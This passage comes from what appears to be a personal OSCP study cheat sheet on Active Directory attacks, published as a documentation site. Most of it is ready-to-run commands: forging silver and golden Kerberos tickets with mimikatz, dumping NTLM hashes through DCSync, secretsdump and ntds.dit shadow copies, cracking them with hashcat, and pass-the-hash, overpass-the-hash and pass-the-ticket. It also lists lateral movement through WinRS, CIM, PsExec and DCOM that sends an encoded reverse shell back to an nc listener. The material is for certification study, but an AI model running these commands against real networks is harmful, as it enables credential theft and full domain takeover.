<li class="">Domain SID: in the same output take the part of the SID before the last dash</li>
<li class="">Target SPN (eg <code>HTTP/web04.corp.com</code>)</li>
</ul><p>then u can run <code>kerberos::golden /sid:&lt;domain sid&gt; /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:&lt;ntlm hash&gt; /user:&lt;user&gt;</code> u can choose any user, preferably the user ur currently accessing so u can access that service using that ticket</p><p>[only for specific web04 example] use <code>iwr -UseDefaultCredentials http://web04/</code> (response should be 200) or <code>klist</code> to confirm success (cached ticket should have 1 for ur requested server)</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="domain-backup-abuse-get-ntlm-of-other-users">Domain Backup Abuse (get NTLM of other users)<a href="#domain-backup-abuse-get-ntlm-of-other-users" class="hash-link" aria-label="Direct link to Domain Backup Abuse (get NTLM of other users)" title="Direct link to Domain Backup Abuse (get NTLM of other users)" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires: Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights (shown in Bloodhound). By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.</p><p>(Req shell access) You can obtain the ntlm hash for any user using mimikatz: <code>lsadump::dcsync /user:&lt;user&gt;</code>  then copy the NTLM hash and store it in a file named hashes.dcsync on kali, then <code>hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></p><p>(Req plaintext password) or you can do it in linux: <code>impacket-secretsdump -just-dc-user &lt;target user&gt; &lt;domain&gt;/&lt;user w perms&gt;:&lt;password&gt;@&lt;ip**&gt;**</code> (eg <code>impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:&quot;BrouhahaTungPerorateBroom2023\!&quot;@192.168.50.70</code>)</p><p>the NTLM hash can be found in the section showed here:
<img decoding="async" loading="lazy" alt="Screenshot of impacket-secretsdump output" src="/portfolio/assets/images/DomainBackupAbuse-da60f4aa406ca67db9ef5a7aad4bb015.png" width="915" height="385" class="img_ev3q"></p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pass-the-hash-login-if-u-have-ntlm">Pass the Hash (login if u have NTLM)<a href="#pass-the-hash-login-if-u-have-ntlm" class="hash-link" aria-label="Direct link to Pass the Hash (login if u have NTLM)" title="Direct link to Pass the Hash (login if u have NTLM)" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires (all conditions rather common):</p><ul>
<li class="">only NTLM auth is used</li>
<li class="">NTLM hash of a user on the machine</li>
<li class="">SMB connection through the firewall (commonly port 445)</li>
<li class="">ADMIN$ share must be available, and File and Printer Sharing has to be turned on (default settings)</li>
</ul><p>However, u usually also require local admin rights on target machine.</p><p>run this on kali:  <code>/usr/bin/impacket-wmiexec -hashes :&lt;compromised hash&gt; &lt;compromised user&gt;@&lt;victim ip&gt;</code> (eg <code>/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73</code> )</p><p>run this also if the above don&#x27;t work: <code>pth-winexe -U &lt;domain&gt;/&lt;user&gt; //&lt;victim ip&gt; cmd.exe</code> (eg <code>pth-winexe -U jeeves/Administrator //10.10.10.63 cmd.exe</code>)</p></div></div></details><h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="lateral-movement">Lateral Movement<a href="#lateral-movement" class="hash-link" aria-label="Direct link to Lateral Movement" title="Direct link to Lateral Movement" translate="no">​</a></h2><p>Try another method if one of the method doesn’t work…sometimes some method works but some dont…idk also
For contents of encode.py refer <a class="" href="/portfolio/docs/appendix/encode-py">here</a></p><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="winrs">WinRS<a href="#winrs" class="hash-link" aria-label="Direct link to WinRS" title="Direct link to WinRS" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires: current user is part of Remote Management Users group on target machine</p><p>Replace the IP address in <code>encode.py</code> then <code>python3 encode.py</code> and copy the output. The, run <code>nc -nvlp 443</code></p><p>On the victim machine on cmd: <code>winrs -r:&lt;client name like files04&gt; -u:&lt;user&gt; -p:&lt;pw&gt;  &quot;&lt;output&gt;&quot;</code></p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="powershell-methods">Powershell methods<a href="#powershell-methods" class="hash-link" aria-label="Direct link to Powershell methods" title="Direct link to Powershell methods" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires: current user is a Local Admin on target client</p><p>Replace the IP address in <code>encode.py</code> then <code>python3 encode.py</code> and copy the output. The, run <code>nc -nvlp 443</code></p><p>Run them line by line in powershell on the victim. Don&#x27;t forget to change the user, password and/or paste the output!</p><p>Option 1:</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$username = &#x27;&lt;user&gt;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$password = &#x27;&lt;pw&gt;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$options = New-CimSessionOption -Protocol DCOM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$session = New-Cimsession -ComputerName &lt;target ip&gt; -Credential $credential -SessionOption $Options </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$command = &#x27;&lt;output&gt;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};</span><br></span></code></pre></div></div></div></div></details><p>Option 2:</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$username = &#x27;&lt;user&gt;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$password = &#x27;&lt;pw&gt;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">New-PSSession -ComputerName &lt;target ip&gt; -Credential $credential</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter-PSSession &lt;id&gt; # Get id from the output of the previous command</span><br></span></code></pre></div></div></div></div></details></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="psexec">PsExec<a href="#psexec" class="hash-link" aria-label="Direct link to PsExec" title="Direct link to PsExec" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires:</p><ul>
<li class="">user and pw of a local admin on the target client (can try to crack the pw by bruteforcing NTLM or other hashes found)</li>
<li class="">ADMIN$ share must be available, and File and Printer Sharing has to be turned on (default settings)</li>
</ul><p>copy PsExec64 from kali (in desktop/cybertools/sysinternals) <code>.\PsExec64.exe -i  \\&lt;client name like FILES04&gt; -u corp\&lt;user&gt; -p &lt;pw&gt; &lt;cmd or other process u wanna start&gt;</code> (eg <code>.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd</code>)</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="overpass-the-hash">Overpass the Hash<a href="#overpass-the-hash" class="hash-link" aria-label="Direct link to Overpass the Hash" title="Direct link to Overpass the Hash" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires:</p><ul>
<li class="">an NTLM hash</li>
</ul><p>in mimikatz: <code>sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:powershell</code> (eg <code>sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</code>). then, start a service as that user (like <code>net use \\files04</code>) and then u can do <code>C:\tools\SysinternalsSuite\PsExec.exe \\files04 cmd</code> to gain code execution as that user thru TGT instead of NTLM</p><p>Basicly mimikatz helps to do the whole Kerberos auth process using NTLM.</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pass-the-ticket">Pass the Ticket<a href="#pass-the-ticket" class="hash-link" aria-label="Direct link to Pass the Ticket" title="Direct link to Pass the Ticket" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires: There should be a user on a service that you have identified that you want to compromise. Or maybe u just export all the tickets and check if each of them work and what u can access idk</p><p>run <code>privilege::debug</code> then <code>sekurlsa::tickets /export</code> in mimikatz, then look at the generated kirbi files to find an appropriate user + service that u wanna target. once found, <code>kerberos::ptt &lt;filename&gt;.kirbi</code>. it should return a ‘File: smth smth: OK’ and when u run <code>klist</code> in powershell it should show a ticket from the target user (under client) on the target service (under server). then u can just use the service like <code>ls \\web04\&lt;shared folder&gt;</code> or smth</p><p>Mimikatz extracts the stored TGSes and can import them to our current user to give us perms</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="dcom">DCOM<a href="#dcom" class="hash-link" aria-label="Direct link to DCOM" title="Direct link to DCOM" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires: current user to have an account on target machine</p><p>In powershell: <code>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;&lt;target ip&gt;&quot;))</code> then replace the IP address in <code>encode.py</code> then <code>python3 encode.py</code> and copy the output. The, run <code>nc -nvlp 443</code> to generate the encoded string and use the following command:
<code>$dcom.Document.ActiveView.ExecuteShellCommand(&quot;powershell&quot;,$null,&quot;&lt;python output&gt;&quot;,&quot;7&quot;)</code></p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="golden-ticket">Golden Ticket<a href="#golden-ticket" class="hash-link" aria-label="Direct link to Golden Ticket" title="Direct link to Golden Ticket" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires: Either krbtgt NTLM hash or admin perms on DC machine</p><p>If you have admin perms on DC machine, run mimikatz on the DC, then <code>privilege::debug</code> and <code>lsadump::lsa patch</code> then search for krbtgt and get the ntlm hash.</p><p>then get the domain sid (basically the whole thing until just before the last dash) using <code>whoami /user</code> then do <code>kerberos::purge</code> and <code>kerberos::golden /user:&lt;user&gt; /domain:&lt;domain&gt; /sid:&lt;sid&gt; /krbtgt:&lt;ntlm hash&gt; /ptt</code> (eg <code>kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt</code>) then do <code>misc::cmd</code> to launch cmd, then <code>PsExec.exe \\dc1 cmd.exe</code> . However, PsExec with the ip address instead of \dc1 would force ntlm auth and fail.</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="shadow-copies">Shadow Copies<a href="#shadow-copies" class="hash-link" aria-label="Direct link to Shadow Copies" title="Direct link to Shadow Copies" translate="no">​</a></h3><p>pure persistence, i think no need for OSCP cuz it requires u to have domain admin on DC</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires: Domain admin on DC</p><p>on dc as domain admin: <code>vshadow.exe -nw -p  C:</code>, take note of &#x27;shadow copy device name&#x27;. then <code>copy &lt;shadow copy device name&gt;\windows\ntds\ntds.dit c:\ntds.dit.bak</code> and <code>reg.exe save hklm\system c:\system.bak</code>. transfer files to kali, then on kali, <code>impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL</code>. it should print out all the hashes then u save somewhere</p></div></div></details></div></div></details></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">Last updated<!-- --> on <b><time datetime="2026-01-04T13:28:02.000Z" itemprop="dateModified">Jan 4, 2026</time></b></span></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/portfolio/docs/category/general"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">General</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/portfolio/docs/general/Backgrounding"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Backgrounding</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#core-concepts" class="table-of-contents__link toc-highlight">Core concepts</a><ul><li><a href="#ldap" class="table-of-contents__link toc-highlight">LDAP</a></li><li><a href="#distinguished-name" class="table-of-contents__link toc-highlight">Distinguished Name</a></li><li><a href="#ntlm-auth-steps" class="table-of-contents__link toc-highlight">NTLM Auth Steps</a></li><li><a href="#kerberos-auth-steps" class="table-of-contents__link toc-highlight">Kerberos Auth Steps</a></li><li><a href="#ad-permissions" class="table-of-contents__link toc-highlight">AD permissions</a></li><li><a href="#default-users" class="table-of-contents__link toc-highlight">Default Users</a></li><li><a href="#miscellaneous" class="table-of-contents__link toc-highlight">Miscellaneous</a></li></ul></li><li><a href="#enumeration" class="table-of-contents__link toc-highlight">Enumeration</a></li><li><a href="#exploit-methods" class="table-of-contents__link toc-highlight">Exploit Methods</a><ul><li><a href="#spray-passwords" class="table-of-contents__link toc-highlight">Spray Passwords</a></li><li><a href="#as-rep-roasting-cracking-user-pw" class="table-of-contents__link toc-highlight">AS-REP Roasting (cracking user pw)</a></li><li><a href="#kerberoasting-cracking-servicespn-pw" class="table-of-contents__link toc-highlight">Kerberoasting (cracking service/SPN pw)</a></li><li><a href="#silver-ticket-forge-tgs-to-access-services" class="table-of-contents__link toc-highlight">Silver Ticket (forge TGS to access services)</a></li><li><a href="#domain-backup-abuse-get-ntlm-of-other-users" class="table-of-contents__link toc-highlight">Domain Backup Abuse (get NTLM of other users)</a></li><li><a href="#pass-the-hash-login-if-u-have-ntlm" class="table-of-contents__link toc-highlight">Pass the Hash (login if u have NTLM)</a></li></ul></li><li><a href="#lateral-movement" class="table-of-contents__link toc-highlight">Lateral Movement</a><ul><li><a href="#winrs" class="table-of-contents__link toc-highlight">WinRS</a></li><li><a href="#powershell-methods" class="table-of-contents__link toc-highlight">Powershell methods</a></li><li><a href="#psexec" class="table-of-contents__link toc-highlight">PsExec</a></li><li><a href="#overpass-the-hash" class="table-of-contents__link toc-highlight">Overpass the Hash</a></li><li><a href="#pass-the-ticket" class="table-of-contents__link toc-highlight">Pass the Ticket</a></li><li><a href="#dcom" class="table-of-contents__link toc-highlight">DCOM</a></li><li><a href="#golden-ticket" class="table-of-contents__link toc-highlight">Golden Ticket</a></li><li><a href="#shadow-copies" class="table-of-contents__link toc-highlight">Shadow Copies</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2026 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>